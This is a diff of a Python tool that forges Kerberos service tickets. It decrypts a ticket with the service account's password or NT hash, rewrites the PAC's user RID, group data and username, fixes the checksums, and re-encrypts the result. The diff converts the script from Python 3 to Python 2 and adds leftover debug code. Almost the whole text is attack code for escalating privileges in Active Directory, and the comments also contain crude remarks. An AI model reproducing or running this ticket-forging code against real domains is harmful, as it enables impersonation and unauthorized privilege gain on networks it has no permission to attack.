@@ -1,4 +1,4 @@
-#!/usr/bin/env python3 -tt
+#!/usr/local/bin/python2 -tt
 
 import kerberos
 from pyasn1.codec.ber import encoder, decoder
@@ -6,17 +6,17 @@ from pyasn1.type import univ, useful
 import struct
 import datetime
 import re
-import pac
+import PAC
 
 
 def walk(t):
 	if type(t) == str:
-		print('String: %s' % t)
+		print 'String: %s' % t
 	else:
-		print('Length: %i' % len(t))
+		print 'Length: %i' % len(t)
 		for i in range(len(t)):
-			print('---%i---' % i)
-			print(t[i])
+			print '---%i---' % i
+			print t[i]
 
 
 #Sequence().setComponentByPosition(0, BitString("'01000000101000010000000000000000'B")).setComponentByPosition(1, Sequence().setComponentByPosition(0, Integer(23)).setComponentByPosition(1, OctetString(hexValue='dfa121845d72f43271bbb33cd9e69443'))).setComponentByPosition(2, GeneralString('MEDIN.LOCAL')).setComponentByPosition(3, Sequence().setComponentByPosition(0, Integer(1)).setComponentByPosition(1, Sequence().setComponentByPosition(0, GeneralString('tm')))).setComponentByPosition(4, Sequence().setComponentByPosition(0, Integer(1)).setComponentByPosition(1, OctetString(''))).setComponentByPosition(5, GeneralizedTime('20140403172846Z')).setComponentByPosition(6, GeneralizedTime('20140403173119Z'))
@@ -38,10 +38,10 @@ def updatetimestampsserverticket(ticket, authtime=None, starttime=None, endtime=
 	# DIAF
 	#  -Tim
 	# P.S. Suck it
-	ticket.getComponentByPosition(5)._value = str(useful.GeneralizedTime(authtime))
-	ticket.getComponentByPosition(6)._value = str(useful.GeneralizedTime(starttime))
-	ticket.getComponentByPosition(7)._value = str(useful.GeneralizedTime(endtime))
-	ticket.getComponentByPosition(8)._value = str(useful.GeneralizedTime(renewtiltime))
+	ticket.getComponentByPosition(5)._value = useful.GeneralizedTime(authtime)
+	ticket.getComponentByPosition(6)._value = useful.GeneralizedTime(starttime)
+	ticket.getComponentByPosition(7)._value = useful.GeneralizedTime(endtime)
+	ticket.getComponentByPosition(8)._value = useful.GeneralizedTime(renewtiltime)
 
 	return ticket
 
@@ -58,7 +58,7 @@ def updateusernameinencpart(key, rawticket, username, debug=False, verbose=False
 		encserverticket = serverticket.getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2).asOctets()
 	except:
 		raise ValueError('Unable to decode ticket. Invalid file.')
-	if verbose: print('Ticket succesfully decoded')
+	if verbose: print 'Ticket succesfully decoded'
 
 	decserverticketraw, nonce = kerberos.decrypt(key, 2, encserverticket)
 
@@ -86,25 +86,28 @@ def getpac(key, rawticket, debug=False, verbose=False):
 		encserverticket = serverticket.getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2).asOctets()
 	except:
 		raise ValueError('Unable to decode ticket. Invalid file.')
-	if verbose: print('Ticket succesfully decoded')
+	if verbose: print 'Ticket succesfully decoded'
 
 	decserverticketraw, nonce = kerberos.decrypt(key, 2, encserverticket)
 
 	if decserverticketraw == None:
 		raise ValueError('Unable to decrypt ticket. Invalid key.')
 	elif verbose:
-		print('Decryption successful')
+		print 'Decryption successful'
 
 	
 	decserverticket, extra = decoder.decode(decserverticketraw)
+	# have two here because I was using one to verify that the rewrite matched
+	# This stuff should be removed, if it is still here Tim forgot...again
+	origdecserverticket, extra = decoder.decode(decserverticketraw)
 
 	# change the validity times in the server ticket
 	updatetimestampsserverticket(decserverticket, str(decserverticket[5]), str(decserverticket[6]), str(decserverticket[7]), str(decserverticket[8]))
 
 	adifrelevant, extra = decoder.decode(decserverticket[9][0][1])
-	pac = adifrelevant.getComponentByPosition(0).getComponentByPosition(1)
+	pac = str(adifrelevant.getComponentByPosition(0).getComponentByPosition(1))
 
-	return bytearray(pac)
+	return pac
 
 def updatepac(key, rawticket, pac, debug=False, verbose=False):
 	# attempt decoding of ticket
@@ -115,14 +118,14 @@ def updatepac(key, rawticket, pac, debug=False, verbose=False):
 		encserverticket = serverticket.getComponentByPosition(0).getComponentByPosition(3).getComponentByPosition(2).asOctets()
 	except:
 		raise ValueError('Unable to decode ticket. Invalid file.')
-	if verbose: print('Ticket succesfully decoded')
+	if verbose: print 'Ticket succesfully decoded'
 
 	decserverticketraw, nonce = kerberos.decrypt(key, 2, encserverticket)
 
 	if decserverticketraw == None:
 		raise ValueError('Unable to decrypt ticket. Invalid key.')
 	elif verbose:
-		print('Decryption successful')
+		print 'Decryption successful'
 
 	
 	decserverticket, extra = decoder.decode(decserverticketraw)
@@ -131,13 +134,17 @@ def updatepac(key, rawticket, pac, debug=False, verbose=False):
 	#	print '---%i---' % i
 	#	print decserverticket[3][i]
 
+	# have two here because I was using one to verify that the rewrite matched
+	# This stuff should be removed, if it is still here Tim forgot...again
+	origdecserverticket, extra = decoder.decode(decserverticketraw)
+
 	# change the validity times in the server ticket
 	updatetimestampsserverticket(decserverticket, str(decserverticket[5]), str(decserverticket[6]), str(decserverticket[7]), str(decserverticket[8]))
 
 	adifrelevant, extra = decoder.decode(decserverticket[9][0][1])
 
 
-	chksum = kerberos.chksum(key, b'\x11\x00\x00\x00', pac)
+	chksum = kerberos.chksum(key, '\x11\x00\x00\x00', pac)
 	#print 'newchecksum:  %s' %  chksum.encode('hex')
 
 	# repair server checksum
@@ -204,18 +211,18 @@ if __name__ == '__main__':
 	elif args.nthash != None:
 		key = args.nthash.decode('hex')
 	else:
-		print("You must provide either the password (-p) or the hash (-n)")
+		print "You must provide either the password (-p) or the hash (-n)"
 		exit(1)
 
 	# read the ticket from the file
 	fullraw = args.infile.read()
 	args.infile.close()
+
 	# do the rewrite
 	#newticket = rewriteticket(key, fullraw,  debug=args.debug, verbose=args.verbose)
 
-	pac_str = getpac(key, fullraw)
-
-	pacobj = pac.PAC(pac=pac_str)
+	pac = getpac(key, fullraw)
+	pacobj = PAC.PAC(pac)
 
 	# change user rid
 	if args.userrid:
@@ -232,8 +239,8 @@ if __name__ == '__main__':
 		pacobj.PacLoginInfo.DisplayName = args.username.encode('utf-16le')
 		
 
-	pac_str = pacobj.encode()
-	newticket = updatepac(key, fullraw, pac_str)
+	pac = pacobj.encode()
+	newticket = updatepac(key, fullraw, pac)
 
 	if args.username:
 		updateusernameinencpart(key, newticket, args.username)
